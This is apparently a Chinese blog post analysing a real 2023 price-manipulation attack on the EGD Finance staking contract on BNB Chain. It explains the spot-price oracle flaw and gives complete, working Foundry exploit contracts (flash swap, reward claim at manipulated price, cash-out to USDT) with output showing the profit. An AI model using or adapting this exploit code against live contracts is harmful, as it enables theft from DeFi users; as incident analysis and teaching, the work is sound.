---
title: "EGD Finance 价格操纵攻击事件分析"
date: 2023-03-06T15:09:31+08:00
draft: false
author: yinhui
categories: [security]
tags: [defi] 
---

## 背景介绍

攻击事件发生在 https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3 

[攻击者](https://bscscan.com/address/0xee0221d76504aec40f63ad7e36855eebf5ea5edd)调用[攻击合约](https://bscscan.com/address/0xc30808d9373093fbfcec9e026457c6a9dab706a7)对 [EGD_Finance](https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code)  进行了价格操纵攻击, 进而套现了不少USDT.

可以在这里看到攻击流程:  https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3



另外一篇关于该攻击的逆向分析教程在这里: [https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/03_write_your_own_poc#手把手撰寫-poc---以-egd-finance-為例](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/03_write_your_own_poc#手把手撰寫-poc---以-egd-finance-為例)

我这里从正向的角度, 一步步来回放本次攻击.



## Code Review

### 逻辑合约

EGD_Finance 在 这里代理合约位置 : https://bscscan.com/address/0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370#code

通过点击区块链浏览器上的"Read as Proxy" 按钮可以得到其逻辑合约为 " [0x93c175439726797dcee24d08e4ac9164e88e7aee](https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code)"

或者通过读取代理合约的`_IMPLEMENTATION_SLOT` 也可以得到当前使用的逻辑合约地址

```
bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
```

在逻辑合约 `EGD_Finance`中我们可以看到其实现了一个"质押USDT奖励EGD token"的功能.

基本流程是

```
用户A填写邀请人用户B : function bond(address invitor) external: 
用户A将一定数量的USDT质押给EGD_Finance: function stake(uint amount) external
经过一段时间后
用户A要求领取质押奖励: function claimAllReward() external
EGD_Finance根据用户质押数量, 质押时长, 当前EGD token的价格等因素, 将奖励发放给用户A
```

```solidity
function claimAllReward() external {
				 // 判断是否有质押
        require(userInfo[msg.sender].userStakeList.length > 0, 'no stake');
        // 判断是否在黑名单
        require(!black[msg.sender],'black');
        uint[] storage list = userInfo[msg.sender].userStakeList;
        uint rew;
        uint outAmount;
        uint range = list.length;
        //计算奖励数量
        for (uint i = 0; i < range; i++) {
            UserSlot storage info = userSlot[msg.sender][list[i - outAmount]];
            require(info.totalQuota != 0, 'wrong index');
            uint quota = (block.timestamp - info.claimTime) * info.rates;
            if (quota >= info.leftQuota) {
                quota = info.leftQuota;
            }
            //获取当前EGD的价格,并确定发放EDG数量
            //EGD越便宜, 获得的EGD数量就越多
            rew += quota * 1e18 / getEGDPrice();
            info.claimTime = block.timestamp;
            info.leftQuota -= quota;
            info.claimedQuota += quota;
            if (info.leftQuota == 0) {
                userInfo[msg.sender].totalAmount -= info.totalQuota;
                delete userSlot[msg.sender][list[i - outAmount]];
                list[i - outAmount] = list[list.length - 1];
                list.pop();
                outAmount ++;
            }
        }
        //更新质押列表
        userInfo[msg.sender].userStakeList = list;
        //发送奖励
        EGD.transfer(msg.sender, rew);
        userInfo[msg.sender].totalClaimed += rew;
        emit Claim(msg.sender,rew);
    }
```



### 漏洞代码

采用了如下函数计算EGD token价格

```solidity
    function getEGDPrice() public view returns (uint){
        uint balance1 = EGD.balanceOf(pair);
        uint balance2 = U.balanceOf(pair);
        return (balance2 * 1e18 / balance1);
    }
```

其中 `address public pair`是在初始化函数中赋值的:

```solidity
    function initialize() public initializer {
        __Context_init_unchained();
        __Ownable_init_unchained();
        rate = [200, 180, 160, 140];
        startTime = block.timestamp;
        referRate = [6, 3, 1, 1, 1, 1, 1, 1, 2, 3];
        rateList = [547,493,438,383];
        dailyStakeLimit = 1000000 ether;
        wallet = 0xC8D45fF624F698FA4E745F02518f451ec4549AE8;
        fund = 0x9Ce3Aded1422A8c507DC64Ce1a0C759cf7A4289F;
        EGD = IERC20(0x202b233735bF743FA31abb8f71e641970161bF98);
        U = IERC20(0x55d398326f99059fF775485246999027B3197955);
        router = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair = IPancakeFactory(router.factory()).getPair(address(EGD),address(U));
    }
```

可以在 [代理合约](https://bscscan.com/address/0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370#readProxyContract) 的 Read as Proxy 中点击 pair得到, 其值为 `0xa361433E409Adac1f87CDF133127585F8a93c67d`

或者通过 下面的命令行得到

```
 > anvil -f https://rpc.ankr.com/bsc   --fork-block-number 20245522
 > cast call 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370 "pair()"
 //0x000000000000000000000000a361433e409adac1f87cdf133127585f8a93c67d
```

在区块链浏览器中可以看到该地址是[Pancake LPs (Cake-LP)](https://bscscan.com/token/0xa361433e409adac1f87cdf133127585f8a93c67d)  (Pancake流动性提供商)

也就是说 `getEGDPrice()`是根据地址0xa361433E409Adac1f87CDF133127585F8a93c67d上的EGD token数量和USDT的数量 (也就是流动性)进行价格计算的. 

当USDT数量远远多于EDG数量时, EDG就能兑换更多的USDT, 也就是EDG更昂贵

相反, 当USDT数量很少时, EDG就兑换更少的USDT, 也就是EDG更便宜.

但我们知道在该[Pancke Swap LPs](https://bscscan.com/address/0xa361433e409adac1f87cdf133127585f8a93c67d#code) 提供了`swap`函数进行借贷操作,  我们可以大量借出USDT, 让EDG变得非常便宜, 那么根据下面的代码, 用户获得的用于奖励的EDG的数量就非常多.

```solidity
//获取当前EGD的价格,并确定发放EDG数量
//EGD越便宜, 获得的EGD数量就越多
rew += quota * 1e18 / getEGDPrice();
```



## 攻击过程

### 操纵EDG/USDT的价格, 让EDG非常便宜

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import "forge-std/test.sol";

interface IPancakePair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IEGD_Finance {
    function getEGDPrice() external view returns (uint256);
}

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);

    function balanceOf(address owner) external view returns (uint256);
}

//BSC_USDT合约地址
address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
//EGD_Finance合约地址
address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;
//攻击发生前的区块高度
uint256 constant blockheight = 20245522;

//LPs
IPancakePair constant EGD_USDT_LPPool = IPancakePair(
    0xa361433E409Adac1f87CDF133127585F8a93c67d
);

contract PriceManipulateTest is Test {
    IEGD_Finance egdFinance;

    function setUp() public {
    		//fork 攻击发生前的网络
        vm.createSelectFork("https://rpc.ankr.com/bsc", blockheight);
        egdFinance = IEGD_Finance(EGD_Finance);
        //假设我们的账户上有一些USDT
        deal(address(usdt), address(this), 30000 * 1 ether);
    }

    function testPrice() public {
        console2.log("edg price before:", egdFinance.getEGDPrice());
				
				//借出99.99%的USDT, 让USDT变得非常稀少
        uint256 borrowUSDT = (IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) *
            9_999_999_925) / 10_000_000_000;
        EGD_USDT_LPPool.swap(0, borrowUSDT, address(this), "abcd");

        console2.log(
            "edg price after (i return the borrowed USDT back):",
            egdFinance.getEGDPrice()
        );
    }

    function pancakeCall(
        address,
        uint256,
        uint256 count1,
        bytes calldata
    ) public {
        console2.log(
            "edg price after (i borrowed huge USDT out):",
            egdFinance.getEGDPrice()
        );
        bool success = IERC20(usdt).transfer(
            address(EGD_USDT_LPPool),
            ((count1 * 10_500_000_000) / 10_000_000_000)
        ); //归还本金 + 5%手续费

        require(success);
    }
}

```

输出:

```
~/Desktop/EGDFinanceDemo main !2 9 ❯ forge test --match-contract PriceManipulateTest  
[⠑] Compiling...
[⠒] Compiling 1 files with 0.8.17
[⠆] Solc 0.8.17 finished in 2.36s
Compiler run successful

Running 1 test for test/PriceManipulate.t.sol:PriceManipulateTest
[PASS] testPrice() (gas: 90127)
Logs:
  edg price before: 8093644493314726
  edg price after (i borrowed huge USDT out): 60702333
  edg price after (i return the borrowed USDT back): 8498326714945346
```

可以看到在我借出大量USDT后 和 归还借出的USDT前, EDG的价格由 8093644493314726 变成了 60702333,

归还USDT后价格又恢复了.



### 质押USDT获取EDG奖励

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/test.sol";

address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;
address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;
uint256 constant blockheight = 20245522;

interface IEGD_Finance {
    function bond(address invitor) external;

    function stake(uint256 amount) external;

    function calculateAll(address addr) external view returns (uint256);

    function claimAllReward() external;

    function getEGDPrice() external view returns (uint256);

    function userInfo(
        address
    )
        external
        view
        returns (
            uint256 totalAmount,
            uint256 totalClaimed,
            address invitor,
            bool isRefer,
            uint256 refer,
            uint256 referReward
        );
}

interface IERC20 {
    function decimals() external view returns (uint8);

    function balanceOf(address owner) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);
}

contract StakeTest is Test {
    IEGD_Finance egd_finance;

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/bsc", blockheight);
        egd_finance = IEGD_Finance(EGD_Finance);
        deal(usdt, address(this), 10000 * 10e18);
    }

    function testStake() public {
        /**
        如何找到一个推荐人地址
        到合约地址egd_finance  https://bscscan.com/address/0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370#events
        查看事件，用cast 4byte-event <topic0>， 如果结果是Claim(address,uint256)， 那么topic1就是领取质押奖励的人的地址
        用它当推荐人就可以了。注意， topic1中的地址需要用工具toChecksumAddress转换一下，比如https://web3-tools.netlify.app
         */
        //填写推荐人
        egd_finance.bond(address(0x85cbfaBD709c744C84A36BA47145396d724EE751));
        //批准egd_finance操作我们的usdt
        IERC20(usdt).approve(address(egd_finance), 100 ether);
        //质押
        egd_finance.stake(100 ether);
        (uint256 totalAmount, , , , , ) = egd_finance.userInfo(address(this));

        console2.log("usdt i staked:", totalAmount);
        console2.log("edg i have:", IERC20(egd).balanceOf(address(this)));
        assertEq(100 ether, totalAmount);

        //模拟2天后
        vm.warp(block.timestamp + (2 * 24 * 60 * 60));

        //领取奖励
        egd_finance.claimAllReward();
        console2.log(
            "edg i get from the stake reward (2 days later):",
            IERC20(egd).balanceOf(address(this))
        );
    }
}

```



输出

```
~/Desktop/EGDFinanceDemo main !2 9 ❯ forge test --match-contract StakeTest  -vv
[⠑] Compiling...
[⠢] Compiling 1 files with 0.8.17
[⠆] Solc 0.8.17 finished in 2.41s
Compiler run successful

Running 1 test for test/Stake.t.sol:StakeTest
[PASS] testStake() (gas: 868614)
Logs:
  usdt i staked: 100000000000000000000
  edg i have: 0
  edg i get from the stake reward (2 days later): 135123268981974350000
```

可以看到, 在正常情况下 质押 100个USDT, 2天后大约能获取135个EDG



### 在操纵价格后获取EDG奖励

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import "forge-std/test.sol";

interface IPancakePair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IEGD_Finance {
    function getEGDPrice() external view returns (uint256);

    function calculateAll(address addr) external view returns (uint256);

    function bond(address invitor) external;

    function stake(uint256 amount) external;

    function claimAllReward() external;
}

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);

    function balanceOf(address owner) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);
}

address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;
address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;
uint256 constant blockheight = 20245522;
IPancakePair constant EGD_USDT_LPPool = IPancakePair(
    0xa361433E409Adac1f87CDF133127585F8a93c67d
);

contract HackTest1 is Test {
    IEGD_Finance egd_finance;

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/bsc", blockheight);
        egd_finance = IEGD_Finance(EGD_Finance);
        deal(usdt, address(this), 50000 ether);
    }

    function testHack() public {
        stake();

        //模拟2天后
        vm.warp(block.timestamp + (2 * 24 * 60 * 60));

        console2.log(
            "all edg in EGD_Finance:",
            IERC20(egd).balanceOf(EGD_Finance)
        );

        console2.log("edg price before:", egd_finance.getEGDPrice());

        console2.log(
            "egd i should reward by noraml case:",
            egd_finance.calculateAll(address(this))
        );

        //贷款（价格操纵）
        uint256 borrowUSDT = (IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) *
            99997600) / 100000000;
        EGD_USDT_LPPool.swap(0, borrowUSDT, address(this), "abcd");
    }

    function stake() public {
        egd_finance.bond(address(0x85cbfaBD709c744C84A36BA47145396d724EE751));
        IERC20(usdt).approve(address(egd_finance), 100 ether);
        egd_finance.stake(100 ether);
    }

    //贷款的回调函数
    function pancakeCall(
        address,
        uint256,
        uint256 count1,
        bytes calldata
    ) public {
        console2.log(
            "edg price after (i borrowed huge USDT out):",
            egd_finance.getEGDPrice()
        );

        //在价格不合理的时候领取质押奖励
        egd_finance.claimAllReward();

        //归还贷款本金 + 5%手续费
        bool success = IERC20(usdt).transfer(
            address(EGD_USDT_LPPool),
            ((count1 * 10_500_000_000) / 10_000_000_000)
        );

        console2.log(
            "edg i get from the stake reward:",
            IERC20(egd).balanceOf(address(this))
        );

        require(success);
    }
}

```



输出:

```
~/Desktop/EGDFinanceDemo main !2 9 ❯ forge test --match-contract HackTest1  -vv
[⠑] Compiling...
[⠢] Compiling 1 files with 0.8.17
[⠰] Solc 0.8.17 finished in 2.44s
Compiler run successful

Running 1 test for test/Hack.t.sol:HackTest1
[PASS] testHack() (gas: 909189)
Logs:
  all edg in EGD_Finance: 5678872403240763806350000
  edg price before: 8096310933284567
  egd i should reward by noraml case: 1093999999999910400
  edg price after (i borrowed huge USDT out): 194311462398
  edg i get from the stake reward: 5630136207606302655330000
```

可以看到, 我们本来只能领取EDG:  1093999999999910400  变成了  5630136207606302655330000, 放大了500万倍.



### 将获利兑换为USDT进行套现



我这里为了让逻辑更清晰, 新建一个合约专门用于USDT兑换:

```solidity
contract Egd2USDT {
    function swap2usdt() public {
        IERC20(egd).transferFrom(
            msg.sender,
            address(this),
            IERC20(egd).balanceOf(msg.sender)
        );

        //将egd兑换成usdt
        address[] memory path = new address[](2);
        path[0] = egd;
        path[1] = usdt;
        IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(egd).balanceOf(address(this)),
            1,
            path,
            address(msg.sender),
            block.timestamp
        );
    }
}
```

其中

`swapExactTokensForTokensSupportingFeeOnTransferTokens`函数是[PancakeSwap](https://docs.pancakeswap.finance/code/smart-contracts/pancakeswap-exchange/v2/router-v2#swapexacttokensfortokenssupportingfeeontransfertokens)的一个交易函数，用于在两个代币之间进行兑换。

- `amountIn`：输入代币数量；
- `amountOutMin`：输出代币数量的下限，防止交易价格波动过大导致交易失败；
- `path`：一个代币路径数组，表示交易的路径；
- `to`：输出代币的接收地址；
- `deadline`：交易截止时间，超过此时间交易将失败。

path 参数是一个长度至少为 2 的地址数组，用于指定交易路径。

具体来说，如果我们想要在 PancakeSwap 上进行 A 代币与 B 代币之间的兑换，那么我们需要指定一个交易路径，例如：

- 如果直接存在 A/B 交易对，则 path 数组为 [address(A), address(B)]。
- 如果不存在 A/B 交易对，但存在 A/C 和 C/B 交易对，则 path 数组为 [address(A), address(C), address(B)]。



```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import "forge-std/test.sol";

interface IPancakePair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IEGD_Finance {
    function getEGDPrice() external view returns (uint256);

    function calculateAll(address addr) external view returns (uint256);

    function bond(address invitor) external;

    function stake(uint256 amount) external;

    function claimAllReward() external;
}

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);

    function balanceOf(address owner) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;
}

address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;
address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;
uint256 constant blockheight = 20245522;
IPancakePair constant EGD_USDT_LPPool = IPancakePair(
    0xa361433E409Adac1f87CDF133127585F8a93c67d
);
IPancakeRouter constant pancakeRouter = IPancakeRouter(
    payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)
);

contract Egd2USDT {
    function swap2usdt() public {
        IERC20(egd).transferFrom(
            msg.sender,
            address(this),
            IERC20(egd).balanceOf(msg.sender)
        );

        //将egd兑换成usdt
        address[] memory path = new address[](2);
        path[0] = egd;
        path[1] = usdt;
        IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(egd).balanceOf(address(this)),
            1,
            path,
            address(msg.sender),
            block.timestamp
        );
    }
}

contract HackTest2 is Test {
    IEGD_Finance egd_finance;
    Egd2USDT egd2usdt;

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/bsc", blockheight);
        egd_finance = IEGD_Finance(EGD_Finance);
        egd2usdt = new Egd2USDT();
        deal(usdt, address(this), 30000 ether);
    }

    function testHack() public {
        uint256 balanceBefore = IERC20(usdt).balanceOf(address(this));

        stake();

        //模拟2天后
        vm.warp(block.timestamp + (2 * 24 * 60 * 60));

        //贷款（价格操纵）
        uint256 borrowUSDT = (IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) *
            99997600) / 100000000;
        EGD_USDT_LPPool.swap(0, borrowUSDT, address(this), "abcd");

        //将获得的egd换成usdt
        console2.log(
            "i will apporve all edg coin to another contract:",
            IERC20(egd).balanceOf(address(this))
        );
        IERC20(egd).approve(
            address(egd2usdt),
            IERC20(egd).balanceOf(address(this))
        );
        
        egd2usdt.swap2usdt();

        console.log(
            "earned usdt:",
            (IERC20(usdt).balanceOf(address(this)) - balanceBefore) / 1 ether
        );
    }

    function stake() public {
        egd_finance.bond(address(0x85cbfaBD709c744C84A36BA47145396d724EE751));
        IERC20(usdt).approve(address(egd_finance), 100 ether);
        egd_finance.stake(100 ether);
    }

    //贷款的回调函数
    function pancakeCall(
        address,
        uint256,
        uint256 count1,
        bytes calldata
    ) public {
        //在价格不合理的时候领取质押奖励
        egd_finance.claimAllReward();

        //归还贷款本金 + 5%手续费
        uint256 fee = (count1 * 500_000_000) / 10_000_000_000;
        bool success = IERC20(usdt).transfer(
            address(EGD_USDT_LPPool),
            (count1 + fee)
        );

        require(success);
    }
}

```

> 注意: 
>
> ```solidity
> //贷款（价格操纵）
>         uint256 borrowUSDT = (IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) *
>             99997600) / 100000000;
> ```
>
> 在到底借款多少(这里的99.9976%)需要微调, 防止最后获取的EDG的数量超过池子中的EDG总量而导致转账失败.

输出:

```
~/Desktop/EGDFinanceDemo main !2 9 ❯ forge test --match-contract HackTest2 -vv
[⠑] Compiling...
[⠆] Compiling 1 files with 0.8.17
[⠔] Solc 0.8.17 finished in 2.58s
Compiler run successful

Running 1 test for test/Hack2.t.sol:HackTest2
[PASS] testHack() (gas: 1074481)
Logs:
  i will apporve all edg coin to another contract: 5630136207606302655330000
  earned usdt (ether): 14258

Test result: ok. 1 passed; 0 failed; finished in 666.79ms
```



套现 14258 $ 
